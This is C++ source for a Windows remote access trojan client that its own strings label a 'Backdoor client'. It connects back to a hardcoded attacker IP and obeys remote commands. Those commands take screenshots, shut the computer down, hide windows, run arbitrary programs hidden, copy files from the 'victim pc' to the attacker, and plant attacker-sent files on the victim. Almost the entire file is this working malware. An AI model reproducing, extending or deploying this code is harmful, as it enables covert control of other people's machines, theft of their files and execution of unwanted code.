#define _CRT_SECURE_NO_WARNINGS
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.
#include <winsock.h>
#include <windows.h>
#include <fstream>
#include <iostream>
#include <thread>
#include <string>
#include <sstream>
#include <vector>
#include <random>
#include <chrono>
#include <vector>
#include <thread>
#pragma once
#define _DEBUG_
#define MAX_BUF (1024*10)
#define winsockVersion MAKEWORD(2, 2)
#define socketPort 3333 //24400 - 25555
//#define ipv4ADDR "102.41.140.53" // for public use publuc ip of server
//#define ipv4ADDR "192.168.1.7"  // for private use private ip of server

char cpuId[48]; 
int counter = 0;
using namespace std;
#include <iostream>
#include <string>
#include <vector>


std::string getPrivateIPAddress() {
	std::vector<std::string> privateIPs;

	char hostname[1024];
	if (gethostname(hostname, 1024) != 0) {
		std::cerr << "Error getting hostname: " << std::endl;
		return "";
	}

	struct addrinfo hints, * res;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	int status = getaddrinfo(hostname, nullptr, &hints, &res);
	if (status != 0) {
		std::cerr << "Error getting address information: " << gai_strerror(status) << std::endl;
		return "";
	}

	for (struct addrinfo* p = res; p != nullptr; p = p->ai_next) {
		char name[NI_MAXHOST];
		if (getnameinfo(p->ai_addr, p->ai_addrlen, name, NI_MAXHOST, nullptr, 0, NI_NAMEREQD) == 0) {
			//std::cout << "Canonical name: " << name << std::endl;
			struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
			char ipstr[INET_ADDRSTRLEN];
			inet_ntop(AF_INET, &(ipv4->sin_addr), ipstr, INET_ADDRSTRLEN);
			//std::cout << "IP address: " << ipstr << std::endl;
			struct in_addr addr = ipv4->sin_addr;
			if (ntohl(addr.s_addr) >> 24 == 0x0A
				|| ntohl(addr.s_addr) >> 20 == (0xAC10 >> 4)
				|| ntohl(addr.s_addr) >> 16 == (0xC0A8)) {
				privateIPs.emplace_back(ipstr);
			}
		}
	}

	freeaddrinfo(res);

	if (!privateIPs.empty()) {
		std::vector<std::string> filteredIPAddresses;
		for (const auto& ipAddress : privateIPs) {
			if (ipAddress.compare(0, 10, "192.168.1.") == 0) {
				filteredIPAddresses.emplace_back(ipAddress);
			}
		}
		return filteredIPAddresses[0];

	}
	else {
		return "";
	}
}
void randmouse() {

	RECT desktopScreenDesc;
	HWND desktopWindow = GetDesktopWindow();

	GetWindowRect(desktopWindow, &desktopScreenDesc);

	while (1)
	{
		SetCursorPos(rand() % desktopScreenDesc.right, rand() % desktopScreenDesc.bottom);
	}
}

enum sendcode
{
	none, text, file,chunks
};


namespace localFunctions
{

	void __cdecl zeroBuffer(char* inputBuffer, int bufferSize)
	{

		std::memset(inputBuffer, NULL, bufferSize);
	};

	void __cdecl sendInfoToServer(unsigned int id, char* byteBuffer, int size, sendcode c)
	{
		
		if (c == none)
		{

			int bytesSent = send(id, byteBuffer, size, NULL);
			if (bytesSent == SOCKET_ERROR)
			{	
				std::cout << "socket_error";
				int error = WSAGetLastError();
				std::cout << error;
			}
			else {
				std::cout << "want to send : " << size << std::endl;
				std::cout << "bytes that sent successfully " << bytesSent << std::endl;
				counter++;
				//std::cout << "sent successfully " << counter <<std::endl;
				Sleep(5);
				
			}//send(id, byteBuffer, size, NULL);

			return;
		};

		char tempBuf[MAX_BUF];
		localFunctions::zeroBuffer(tempBuf, MAX_BUF);


		//assign if it text or file to server in 1st char in the string (1st byte in buffer)
		tempBuf[0] = c;

		memcpy((char*)tempBuf + 1, byteBuffer, size);

		
		int bytesSent = send(id, tempBuf, size + 1, NULL);
		if (bytesSent == SOCKET_ERROR)
		{
			std::cout << "socket_error";
			int error = WSAGetLastError();
			std::cout << error;
		}
		else {
			std::cout << "want to send : " << size << std::endl;
			std::cout << "bytes that sent successfully " << bytesSent << std::endl;
			counter++;
			//std::cout << "sent successfully " << counter << std::endl;
			Sleep(5);

		}
		return;
	};

	void  __cdecl outputColor(int colorCode)
	{

		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), colorCode);
		return;
	};

	//file path1 --> orignal file(src)
	// send file1 into file2
	void __cdecl sendFile(unsigned int socket, const char* filePath1, const char* filePath2)
	{
		/*int total_file_chunks = 33;
		char buffer[sizeof(total_file_chunks)];
		memcpy(buffer, &total_file_chunks, sizeof(total_file_chunks));
		localFunctions::sendInfoToServer(socket, buffer, sizeof(buffer), chunks);*/

		localFunctions::sendInfoToServer(socket, (char*)filePath2, strlen(filePath2), file);

		std::ifstream inStream(filePath1, std::ios::binary);

		// get size of file : 

			//seekg --> to move pointer in file to the end
		inStream.seekg(0, std::ios::end);

		//inStream.tellg() --> getting current position (last entry) (size of file)
		int fileSize = inStream.tellg();

		inStream.seekg(0, std::ios::beg);


		//split file size into how many buffer?
		int endingFileSize = fileSize % MAX_BUF;//bwa2y

		if (endingFileSize == 0)
		{

			endingFileSize = fileSize;
		};

		while (1)
		{
			//std::cout << "total_chunks" << counter;
			char* buf = new char[MAX_BUF]; //temp buf
			localFunctions::zeroBuffer(buf, MAX_BUF);

		
			//read from file and put into buffer
			inStream.read(buf, MAX_BUF);
			
			if (inStream.eof())//true-->no more data in file (eof = end of file)
			{
				int remainingBytes = inStream.gcount();
				std::cout << "remaining bytes: " << remainingBytes << std::endl;

				// Append '\n' to the end of the buffer
	/*			buf[remainingBytes] = "end";
				remainingBytes+=3;*/
				std::memcpy(buf + remainingBytes, "end", 3);
				remainingBytes += 3;
				//send buffer
				localFunctions::sendInfoToServer(socket, buf, remainingBytes, none);


				//std::cout << endingFileSize;
				//
				///////////////////////must debug////////////////////////////////

				//localFunctions::sendInfoToServer(socket, buf, endingFileSize, none);

				delete[] buf;
				//counter++;
				break;
			};

			//send buffer
			
			localFunctions::sendInfoToServer(socket, buf, MAX_BUF, none);
			delete[] buf;
			
		};

		inStream.close();
		std::cout << "total_chunks" << counter;

		return;
	};
};


//check connection
char __cdecl connectToServer(unsigned int clientId)
{
	//create socket address
	sockaddr_in socketAddress;
	socketAddress.sin_family = AF_INET;

	/*takes a 16-bit number in host byte order and returns
	a 16-bit number in network byte order used in TCP/IP
	The htons function can be used to convert an IP port number
	in host byte order to the IP port number in network byte order.
	*/
	socketAddress.sin_port = htons(socketPort);
	//std::string ip = getPrivateIPAddress();
	std::string ip = "192.168.1.107";
	//std::string ip = "197.58.141.243";  
	//std::cout << "Private IP address: " << ip << std::endl;
	//socketAddress.sin_addr.s_addr = inet_addr("192.168.1.8");
	//memset(&(socketAddress.sin_zero), 0, 8);
	inet_pton(AF_INET, ip.c_str(), &socketAddress.sin_addr); //change ip into numeric binary formate
	//inet_pton(AF_INET, ipv4ADDR, &socketAddress.sin_addr); //change ip into numeric binary formate
	
	int connectToServer_STATUS = connect(clientId, (sockaddr*)&socketAddress, sizeof(socketAddress));
	if (connectToServer_STATUS == SOCKET_ERROR)
	{
		//error connection
		std::cout << "..." << std::endl;
		return 0;
	};
	return 1;
};


unsigned int create_socket_clientid() {


	//create a supported env by win to run socket
	WSAData socketDataStructure;

	//function initiates use of the Winsock DLL by a process.
	int socketStartup = WSAStartup(winsockVersion, &socketDataStructure);

	if (socketStartup != 0)	//there is error
	{
		std::cout << "Unable to start socket!" << std::endl;
		return 0;
	};

	//Sock_stream = TCP
	unsigned int clientId = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


	if (clientId == INVALID_SOCKET)
	{
		std::cout << "Creation of socket failed!" << std::endl;

		return 0;
	};

	return clientId;
}

void start_listener(unsigned int clientId) {

	while (1)
	{



		//Connection ERROR
		while (connectToServer(clientId) == 0)
		{
			Sleep(1000);
		};

		cout << "connected successfully " << endl;
		while (1)
		{

			char recvBuffer[MAX_BUF];
			localFunctions::zeroBuffer(recvBuffer, MAX_BUF);

			//The recv() function receives data on a socket with descriptor socket and stores it in a buffer. The recv() call applies only to connected sockets.
			int recievedBytes = recv(clientId, recvBuffer, MAX_BUF, NULL);
			if (recievedBytes <= 0)
			{
				break;
			};

			//receive commands in bytes and use this func to change from bytes into string
			std::string commandSent = std::string(recvBuffer, 0, recievedBytes);
			std::cout << commandSent;
			// 1 byte for each char
			if (commandSent.substr(0, 11) == "closeclient")
			{
				const char* sendMsg = "Backdoor client has been closed";
				localFunctions::sendInfoToServer(clientId, (char*)sendMsg, strlen(sendMsg), text);

				//return 0 to close client
				return;
			}
			else if (commandSent.substr(0, 10) == "screenshot")
			{

				std::vector<char> buffer;
				int width, height;
				SaveScreenshotToMemory(buffer, width, height);

				std::string fileName = "";
				char exe_path[MAX_PATH] = "";
				//retrieves the file path of the current running executable and save into buffer
				if (!GetModuleFileNameA(NULL, exe_path, sizeof(exe_path)) == 0) {
					fileName = exe_path;
					std::size_t pos = fileName.rfind(".");
					if (pos != std::string::npos) { //  '.' character was not found in the path to .exe,
						//delete .exe and make it .txt
						fileName.erase(pos + 1);//earse all after the .
						fileName.append("bmp"); // add new extension
					}
				}

				SaveScreenshotToFile(fileName,buffer, width, height);
	

			}

			else if (commandSent.substr(0, 8) == "shutdown")
			{

				const char* sendMsg = "Shutting down client";
				localFunctions::sendInfoToServer(clientId, (char*)sendMsg, strlen(sendMsg), text);

				std::system("C:\\Windows\\System32\\shutdown /s /t 1");
			}
			/*else if (commandSent.substr(0, 7) == "restart")
			{

				const char* sendMsg = "Shutting down client";
				localFunctions::sendInfoToServer(clientId, (char*)sendMsg, strlen(sendMsg), text);

				std::system("C:\\Windows\\System32\\shutdown /r /t 1");
			}*/
			else if (commandSent.substr(0, 9) == "getwindow")
			{
				// get path of running window (RAT)
				char buffer[MAX_PATH] = "\0";
				char buf1[] = "executable_path:";

				//retrieves the file path of the current running executable and save into buffer
				if (GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0) {
					printf("Cannot get the file path\n");
				}
				char buf3[MAX_PATH] = "\0";
				strcpy_s(buf3, sizeof(buf3), buf1);
				strcat_s(buf3, sizeof(buf3), buffer);

				localFunctions::sendInfoToServer(clientId, buf3, sizeof(buf3) + 1, text);

			}
			else if (commandSent.substr(0, 11) == "hidewindow")
			{
				ShowWindow(GetForegroundWindow(), 0);

				const char* sendMsg = "Window hidden";

				//localFunctions::sendInfoToClient(clientId, (char*)sendMsg, strlen(sendMsg), text);
				localFunctions::sendInfoToServer(clientId, (char*)sendMsg, strlen(sendMsg), text);
			}
			else if (commandSent.substr(0, 12) == "randommouse")
			{
				randmouse();

			}
			else if (commandSent.substr(0, 12) == "shellexecute")
			{
				char path[260];
				localFunctions::zeroBuffer(path, 260);
				memcpy(path, commandSent.substr(13).c_str(), strlen(commandSent.substr(13).c_str()));
				ShellExecuteA(NULL, NULL, path, NULL, NULL, CREATE_NO_WINDOW);
				// SW_SHOW 5	Activates the window and displays it in its current size and position.
			}
			//get file from client to attacker (Must write file on attacker machine)
			else if (commandSent.substr(0, 7) == "getfile")
			{
				commandSent = commandSent.substr(8);
				std::cout << commandSent << std::endl;
				char buf[MAX_BUF];
				localFunctions::zeroBuffer(buf, MAX_BUF);
				int total = 0;
				for (int i = 0; i < commandSent.size(); i++)//get file path + name
				{
					// \x20 = space , \x00=
					if (commandSent[i] == '|')
					{
						//total++;
						buf[i] = '\x00';
						continue;
					};

					buf[i] = commandSent[i];
				};


				std::string filePath1 = std::string(buf, strlen(buf));//src : get filepath to be sent on victim pc
				std::cout << "filepath1:" << filePath1 << std::endl;
				std::string filePath2 = std::string(buf + strlen(buf) + 1, strlen(buf + strlen(buf) + 1));//dest: file path on attacker pc
				std::cout << "filepath2:" << filePath2 << std::endl;

				localFunctions::sendFile(clientId, filePath1.c_str(), filePath2.c_str());
			}
			//attacker to victim (must write on victim machine)
			else if (commandSent.substr(0, 8) == "sendfile")
			{

				std::ofstream outStream(commandSent.substr(9), std::ios::binary);
				bool 	not_end_msg = true;
				while (1)
				{
					char* buf = new char[MAX_BUF];
					localFunctions::zeroBuffer(buf, MAX_BUF);

					int fileByteLength = recv(clientId, buf, MAX_BUF, NULL);

					outStream.write(buf, fileByteLength);

					std::string received_data(buf, fileByteLength);
					if (received_data.find("end") != std::string::npos)
					{
						not_end_msg = false;
						std::cout << "\nunique string found\n";
						delete[] buf;
						break;
					}

					if (fileByteLength < MAX_BUF)
					{

						delete[] buf;
						break;
					};


					delete[] buf;
				};

				outStream.close();
			}



		};
		closesocket(clientId);
		WSACleanup();
	};

}
